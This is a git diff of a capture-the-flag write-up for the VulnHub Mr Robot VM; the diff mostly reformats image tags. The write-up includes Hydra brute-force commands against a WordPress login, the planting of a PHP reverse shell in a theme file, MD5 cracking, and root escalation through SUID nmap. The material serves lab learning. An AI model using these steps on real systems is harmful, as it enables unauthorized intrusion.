@@ -59,8 +59,7 @@ dirb http://192.168.227.7
 
 <img src="images/dirb-start.png" style="align: right" alt="nmap" width="600"/>
 
-<img src="images/dirb-end
-.png" style="align: right" alt="nmap" width="600"/>
+<img src="images/dirb-end.png" style="align: right" alt="nmap" width="600"/>
 
 The Dirb scan uncovered several directories, particularly ones related to WordPress, such as ```/wp-admin```, confirming that the target was running WordPress. Additionally, it revealed the existence of robots.txt, a file commonly used to instruct web crawlers on what content not to index.
 
@@ -84,6 +83,7 @@ I used the fsocity.dic wordlist, but since it contained over 800,000 entries wit
 ```bash
 sort fsocity.dic | uniq > fs-list
 ```
+
 <img src="images/usr.png" style="align: right" alt="nmap" width="600"/>
 
 This reduced the list to about 11,000 unique entries.
@@ -95,17 +95,20 @@ Using Hydra, I started brute-forcing the WordPress login page to find a valid us
 hydra -L fs-list -p test 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
 ```
 
-<img src="images/psw.png" style="align: right" alt="nmap" width="600"/>
+<img src="images/hydra-1.png" style="align: right" alt="nmap" width="600"/>
 
 The attack identified elliot as a valid username. I then brute-forced the password by targeting the "The password you entered for the username" error message:
 
-![psw](images/psw.png)
+
+<img src="images/psw.png" style="align: right" alt="nmap" width="600"/>
 
 I ran the following command:
 ```bash
 hydra -l elliot -P fs-list 192.168.227.7 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
 ```
-![hydra2](images/hydra-2.png)
+
+<img src="images/hydra-2.png" style="align: right" alt="nmap" width="600"/>
+
 
 This revealed elliot's password: ER28-0652. With these credentials, I was able to log in to the WordPress admin panel.
 
@@ -116,7 +119,7 @@ After successfully logging into the WordPress admin panel as elliot, I moved to 
 
 I injected a PHP reverse shell into the 404.php file. The reverse shell script was sourced from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/), a trusted resource for penetration testing tools. 
 
-![php-404](images/php-404.png)
+<img src="images/php-404.png" style="align: right" alt="nmap" width="600"/>
 
 Before injecting the script, I updated the $ip variable to my attacking machine's IP and set $port to 7777, which I would use to capture the reverse shell connection:
 
@@ -138,8 +141,7 @@ To trigger the reverse shell, I visited a non-existent page on the target websit
 
 **Netcat Listener Output:** Once the reverse shell was triggered, a connection was established, and I had remote access to the target machine.
 
-![netcat](images/netcat.png)
-
+<img src="images/netcat.png" style="align: right" alt="nmap" width="600"/>
 
 ### Exploring the File System
 Once I had shell access, I began exploring the file system and found two files of interest in the ```/home/robot``` directory:
@@ -147,7 +149,7 @@ Once I had shell access, I began exploring the file system and found two files o
 **key-2-of-3.txt**: This file contained the second flag, but I was unable to read it due to permission restrictions.
 **password.raw-md5**: This file contained an MD5 hashed password, which I suspected belonged to the user robot.
 
-![ls](images/ls-to-robot.png)
+<img src="images/ls-to-robot.png" style="align: right" alt="nmap" width="600"/>
 
 At this point, I needed to escalate my privileges in order to read the second flag.
 
@@ -170,8 +172,8 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
 
 John quickly cracked the MD5 hash and revealed the password: ```abcdefghijklmnopqrstuvwxyz```
 
-John the Ripper Output:
-![john](images/john.png)
+
+<img src="images/john.png" style="align: right" alt="nmap" width="600"/>
 
 I switched to the user **robot** using the cracked password:
 
@@ -188,8 +190,7 @@ Once logged in as robot, I retrieved the second flag:
 cat /home/robot/key-2-of-3.txt
 ```
 
-![py](images/py.png)
-
+<img src="images/py.png" style="align: right" alt="nmap" width="600"/>
 
 ### Root Privilege Escalation
 To escalate privileges to root, I searched for SUID binaries, which allow files to be executed with elevated privileges:
@@ -197,7 +198,8 @@ To escalate privileges to root, I searched for SUID binaries, which allow files 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
-![find](images/find.png)
+
+<img src="images/find.png" style="align: right" alt="nmap" width="600"/>
 
 Among the results, I found Nmap with the SUID bit set. The version of Nmap installed on the system supported interactive mode, which allows commands to be executed as root.
 
@@ -205,7 +207,7 @@ Among the results, I found Nmap with the SUID bit set. The version of Nmap insta
 nmap --interactive
 ```
 
-![nmap-int](images/nmap-interactive.png)
+<img src="images/nmap-interactive.png" style="align: right" alt="nmap" width="600"/>
 
 I spawned a root shell and captured the final flag:
 
@@ -213,7 +215,8 @@ I spawned a root shell and captured the final flag:
 !sh
 cat /root/key-3-of-3.txt
 ```
-![ls](images/root-3.png)
+
+<img src="images/root-3.png" style="align: right" alt="nmap" width="600"/>
 
 ## Conclusions
 This write-up detailed my experience exploiting the MR Robot VM from VulnHub. The process involved reconnaissance, brute-force attacks, exploitation, and privilege escalation, culminating in capturing all three flags.
